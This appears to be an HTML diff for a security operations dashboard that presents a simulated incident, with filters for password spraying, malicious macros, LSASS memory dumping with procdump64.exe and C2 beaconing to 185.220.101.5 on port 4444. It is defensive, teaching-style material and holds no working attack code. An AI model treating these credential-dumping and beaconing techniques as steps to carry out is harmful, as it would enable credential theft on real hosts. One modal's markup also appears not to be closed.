+                <select class="soc-select" id="analyzer-time-filter">
+                  <option value="all">All Timestamps</option>
+                  <option value="14:32">14:32 UTC (Password Spray Phase)</option>
+                  <option value="15:10">15:10 UTC (Macro & PowerShell Execution)</option>
+                  <option value="15:12">15:12 UTC (LSASS Memory Dump)</option>
+                  <option value="15:16">15:16 UTC (C2 Network Beaconing)</option>
+                </select>
+              </div>
+              <div class="filter-box">
+                <label>Executable / File Path:</label>
+                <select class="soc-select" id="analyzer-path-filter">
+                  <option value="all">All Executable Paths</option>
+                  <option value="temp">C:\Windows\Temp\* (Staged Artifacts)</option>
+                  <option value="powershell">powershell.exe (Script Interpreter)</option>
+                  <option value="winword">WINWORD.EXE (Office App)</option>
+                  <option value="lsass">lsass.exe (Security Authority)</option>
+                  <option value="procdump">procdump64.exe (Dump Tool)</option>
+                  <option value="beacon">beacon.exe (C2 Agent)</option>
+                </select>
+              </div>
+              <div class="filter-box">
+                <label>EventCode / Source:</label>
+                <select class="soc-select" id="analyzer-event-filter">
+                  <option value="all">All EventCodes</option>
+                  <option value="4625">Event 4625 (Failed Logon)</option>
+                  <option value="4624">Event 4624 (Logon Success)</option>
+                  <option value="4104">Event 4104 (ScriptBlock 4104)</option>
+                  <option value="Sysmon 1">Sysmon 1 (Process Create)</option>
+                  <option value="Sysmon 10">Sysmon 10 (ProcessAccess LSASS)</option>
+                  <option value="Sysmon 3">Sysmon 3 (Network Connect)</option>
+                </select>
+              </div>
+              <div class="filter-box">
+                <label>Status / NTSTATUS Code:</label>
+                <select class="soc-select" id="analyzer-status-filter">
+                  <option value="all">All Status Codes</option>
+                  <option value="0xC000006A">0xC000006A (Bad Password)</option>
+                  <option value="0xC0000072">0xC0000072 (Disabled Account)</option>
+                  <option value="0xC0000234">0xC0000234 (Account Locked Out)</option>
+                  <option value="0x0">0x0 (Success / Established)</option>
+                  <option value="0x1fffff">0x1fffff (Full Access Mask)</option>
+                </select>
+              </div>
+              <div class="filter-box">
+                <label>User Account Filter:</label>
+                <select class="soc-select" id="analyzer-user-filter">
+                  <option value="all">All User Accounts</option>
+                </select>
+              </div>
+              <div class="filter-box">
+                <label>IP Repetition Threshold:</label>
+                <select class="soc-select" id="analyzer-ip-repeat-filter">
+                  <option value="all">All IP Addresses</option>
+                  <option value="3">Repeated IPs (&ge; 3 attempts)</option>
+                  <option value="5">High Frequency (&ge; 5 attempts)</option>
+                  <option value="10">Severe Spray (&ge; 10 attempts)</option>
+                </select>
+              </div>
+              <div class="filter-box">
+                <label>Threat Category:</label>
+                <select class="soc-select" id="analyzer-threat-category-filter">
+                  <option value="all">All Telemetry Types</option>
+                  <option value="spray">Brute-Force & Spraying</option>
+                  <option value="macro">Malicious Macros & LOLBins</option>
+                  <option value="lsass">LSASS Memory Dumping</option>
+                  <option value="beacon">C2 Beaconing Traffic</option>
+                </select>
+              </div>
+            </div>
+          </div>
+
+          <!-- Interactive Filtered Log Events Table -->
+          <div class="table-meta-bar mb-2">
+            <span class="text-muted" id="analyzer-table-count" style="font-size: 0.76rem;">Showing 15 of 15 events</span>
+            <span class="text-dim" style="font-size: 0.72rem;">💡 Tip: Click any row to open the full Forensic Inspector & Raw JSON Telemetry.</span>
+          </div>
+
+          <div class="table-responsive">
+            <table class="soc-table" id="analyzer-events-table">
+              <thead>
+                <tr>
+                  <th>Timestamp (UTC)</th>
+                  <th>Event ID</th>
+                  <th>Host / System</th>
+                  <th>Account / User</th>
+                  <th>Source IP / File Path</th>
+                  <th>Command Line / Activity Context</th>
+                  <th>Threat Diagnostics</th>
+                </tr>
+              </thead>
+              <tbody id="analyzer-table-body">
+                <!-- Dynamically generated rows -->
+              </tbody>
+            </table>
+          </div>
+
+          <!-- Virtual Pagination Bar -->
+          <div class="pagination-bar mt-3" id="analyzer-pagination-bar">
+            <div class="pagination-info">
+              <span class="text-dim" style="font-size: 0.75rem;">Rows per page:</span>
+              <select class="soc-select pagination-select" id="pagination-page-size">
+                <option value="15" selected>15 rows</option>
+                <option value="25">25 rows</option>
+                <option value="50">50 rows</option>
+                <option value="100">100 rows</option>
+                <option value="250">250 rows</option>
+              </select>
+            </div>
+            <div class="pagination-controls">
+              <button class="btn btn-sm btn-secondary" id="btn-page-first" title="First Page">&laquo; First</button>
+              <button class="btn btn-sm btn-secondary" id="btn-page-prev" title="Previous Page">&lsaquo; Prev</button>
+              <span class="page-indicator font-mono text-cyan" id="pagination-page-indicator">Page 1 of 1</span>
+              <button class="btn btn-sm btn-secondary" id="btn-page-next" title="Next Page">Next &rsaquo;</button>
+              <button class="btn btn-sm btn-secondary" id="btn-page-last" title="Last Page">Last &raquo;</button>
+            </div>
+          </div>
+
+        </div>
+      </section>
+
+    </main>
+  </div>
+
+  <!-- Incident Escalation Modal -->
+  <div class="soc-modal-backdrop" id="incident-modal">
+    <div class="soc-modal-dialog">
+      <div class="modal-header">
+        <div class="modal-title">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+          <span>SOC Incident Escalation Ticket (Tier-1 &rarr; Tier-2 / IR)</span>
+        </div>
+        <button class="btn-close-modal" id="btn-close-modal">&times;</button>
+      </div>
+      <div class="modal-body">
+        <div class="form-group">
+          <label>Incident Ticket ID:</label>
+          <input type="text" class="soc-input font-mono" id="modal-ticket-id" value="INC-2026-0418-092" readonly>
+        </div>
+        <div class="form-row">
+          <div class="form-group col">
+            <label>Assigned Severity:</label>
+            <select class="soc-select" id="modal-severity">
+              <option value="Critical" selected>P1 - Critical (Immediate Containment)</option>
+              <option value="High">P2 - High</option>
+              <option value="Medium">P3 - Medium</option>
+            </select>
+          </div>
+          <div class="form-group col">
+            <label>Escalation Queue:</label>
+            <input type="text" class="soc-input" value="SOC Tier-2 Incident Response & Threat Forensics" readonly>
+          </div>
+        </div>
+        <div class="form-group">
+          <label>Executive Incident Summary & Findings:</label>
+          <textarea class="soc-textarea" id="modal-summary" rows="4">Phishing Macro execution on host FIN-WS-09 triggered base64 PowerShell de-obfuscation (Event 4104), followed by unauthorized LSASS memory dump (Sysmon 10) via procdump64.exe and outbound C2 beaconing on port 4444 to 185.220.101.5.</textarea>
+        </div>
+        <div class="form-group">
+          <label>Immediate Actions Recommended:</label>
+          <input type="text" class="soc-input" value="1. Isolate FIN-WS-09 | 2. Reset CORP\cjohnson Kerberos TGT | 3. Block C2 IP on Perimeter FW">
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn btn-secondary" id="btn-modal-cancel">Cancel</button>
+        <button class="btn btn-primary" id="btn-modal-submit">Submit Escalation & Notify IR Lead</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Executive Report Preview & PDF Download Modal -->
+  <div class="soc-modal-backdrop" id="report-modal">
+    <div class="soc-modal-dialog report-modal-dialog">
+      <div class="modal-header">
+        <div class="modal-title">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+          <span>Executive Incident Forensics Report (PDF Ready)</span>
+        </div>
+        <button class="btn-close-modal" id="btn-close-report-modal">&times;</button>
+      </div>
+      <div class="modal-body report-modal-body">
+        <div class="report-preview-banner">
+          <div class="preview-badge">PDF PUBLICATION PREVIEW</div>
+          <p>Formatted for executive sign-off, compliance audits, and interview portfolios.</p>
+        </div>
+        
+        <div class="report-doc-preview">
+          <div class="report-doc-header">
+            <div>
+              <h3 style="font-size: 1rem; font-weight: 700; color: var(--text-main);">ENTERPRISE CYBER DEFENSE SOC</h3>
+              <p style="font-size: 0.72rem; color: var(--text-dim);">Security Incident Response & Forensic Investigation Directorate</p>
+            </div>
+            <div style="text-align: right;">
+              <span class="badge-severity badge-critical">CRITICAL (P1)</span>
+              <div class="font-mono text-dim mt-2" style="font-size: 0.75rem;">INC-2026-0418-092</div>
+            </div>
+          </div>
+
+          <div class="report-preview-section mt-3">
+            <h4 class="subtab-h4">Executive Incident Summary</h4>
+            <p style="font-size: 0.78rem; color: var(--text-muted); line-height: 1.5;">
+              On <strong>2026-04-18 at 14:32:00 UTC</strong>, Splunk SIEM detected password spraying from <code class="font-mono text-cyan">198.51.100.45</code> compromising user <code class="font-mono text-cyan">CORP\cjohnson</code>, followed by weaponized macro execution on <code class="font-mono">FIN-WS-09</code>, base64 PowerShell de-obfuscation (Event 4104), unauthorized LSASS memory dumping via <code class="font-mono text-red">procdump64.exe</code> (Sysmon 10), and persistent outbound C2 beaconing on port 4444 to <code class="font-mono text-purple">185.220.101.5</code>.
+            </p>
+          </div>
+
+          <div class="report-preview-grid mt-3">
+            <div class="preview-stat-card">
+              <span class="stat-label">Impacted Host</span>
+              <strong class="stat-val font-mono">FIN-WS-09 (192.168.10.42)</strong>
+            </div>
+            <div class="preview-stat-card">
+              <span class="stat-label">Containment Speed (MTTR)</span>
+              <strong class="stat-val text-green font-mono">18 Minutes</strong>
+            </div>
+            <div class="preview-stat-card">
+              <span class="stat-label">Tuning Noise Reduction</span>
+              <strong class="stat-val text-cyan font-mono">-35.2% Alert Noise</strong>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn btn-secondary" id="btn-cancel-report-modal">Close</button>
+        <a href="reports/Project_Architecture_and_Guide_Printable.html" target="_blank" class="btn btn-outline-cyan">
+          <span>📚 Architecture & Guide PDF</span>
+        </a>
+        <a href="reports/SOC_Executive_Report_Printable.html" target="_blank" class="btn btn-outline-cyan">
+          <span>📄 Open Incident PDF</span>
+        </a>
+        <button class="btn btn-primary" id="btn-download-pdf">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 6 2 18 2 18 9"/><path d="M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2"/><rect x="6" y="14" width="12" height="8"/></svg>
+          <span>Print / Save PDF</span>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Forensic Log Event Inspector & Deep-Dive Modal -->
+  <div class="soc-modal-backdrop" id="log-inspector-modal">
+    <div class="soc-modal-dialog report-modal-dialog">
+      <div class="modal-header">
+        <div class="modal-title">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/><path d="m11 8v6"/><path d="m8 11h6"/></svg>
+          <span>Forensic Log Event Deep-Dive Inspector</span>
+        </div>
+        <button class="btn-close-modal" id="btn-close-inspector">&times;</button>
+      </div>
+      <div class="modal-body" id="inspector-modal-body">
+        <!-- Dynamically populated event fields -->
+      </div>
+      <div class="modal-footer">
+        <button class="btn btn-secondary" id="btn-close-inspector-footer">Close</button>
+        <button class="btn btn-primary" id="btn-inspector-action">🛡️ Execute Containment Action</button>
+      </div>
+  <!-- File Collision Mitigation Modal -->
+  <div class="soc-modal-backdrop" id="file-collision-modal">
+    <div class="soc-modal-dialog">
+      <div class="modal-header">
+        <div class="modal-title">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+          <span>File Name Collision Detected</span>
+        </div>
+        <button class="btn-close-modal" id="btn-close-collision">&times;</button>
+      </div>
+      <div class="modal-body">
+        <div class="report-preview-banner mb-3" style="border-left-color: var(--accent-amber);">
+          <div class="preview-badge" style="color: var(--accent-amber); border-color: var(--accent-amber);">WORKSPACE REPOSITORY CONFLICT</div>
+          <p style="font-size: 0.78rem; color: var(--text-main); margin-top: 0.3rem;">
+            A log file named <code class="font-mono text-cyan" id="collision-filename">example.log</code> is already stored in your workspace repository.
+          </p>
+        </div>
+        <p style="font-size: 0.76rem; color: var(--text-muted); line-height: 1.5;">
+          Please select how you would like to mitigate this conflict and update the live SOC environment:
+        </p>
+        <div class="collision-options-list mt-3">
+          <div class="collision-option-card" id="btn-collision-overwrite">
+            <div class="option-icon">🔄</div>
+            <div class="option-details">
+              <strong>1. Overwrite & Replace Active Telemetry</strong>
+              <div class="text-dim" style="font-size: 0.72rem;">Replaces the existing dataset with this new file across all SOC dashboards.</div>
+            </div>
+          </div>
+          <div class="collision-option-card" id="btn-collision-version">
+            <div class="option-icon">📑</div>
+            <div class="option-details">
+              <strong>2. Save as New Version (<span id="collision-version-label" class="font-mono text-cyan">filename_v2.log</span>)</strong>
+              <div class="text-dim" style="font-size: 0.72rem;">Stores as a separate version without overwriting the previous telemetry.</div>
+            </div>
+          </div>
+          <div class="collision-option-card" id="btn-collision-merge">
+            <div class="option-icon">➕</div>
+            <div class="option-details">
+              <strong>3. Merge & Append to Live Stream</strong>
+              <div class="text-dim" style="font-size: 0.72rem;">Combines new events with the currently loaded telemetry stream.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn btn-secondary" id="btn-collision-cancel">Cancel Upload</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Toast Notification Container -->
+  <div class="soc-toast-container" id="toast-container"></div>
+
+  <script src="app.js"></script>
+</body>
+</html>
